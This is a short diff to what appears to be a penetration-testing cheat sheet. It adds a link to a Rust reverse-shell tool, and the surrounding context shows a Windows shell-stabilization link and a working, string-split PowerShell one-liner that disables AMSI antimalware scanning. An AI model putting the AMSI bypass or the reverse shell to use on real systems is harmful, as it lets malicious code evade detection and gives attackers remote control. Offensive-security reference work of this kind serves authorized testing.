@@ -133,6 +133,9 @@ reset;
 # Windows Shell Stabilization
 https://github.com/antonioCoco/ConPtyShell
 
+# Rust Reverse Shell
+https://github.com/xct/rcat
+
 # AMSI Bypass
 [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)
 ```
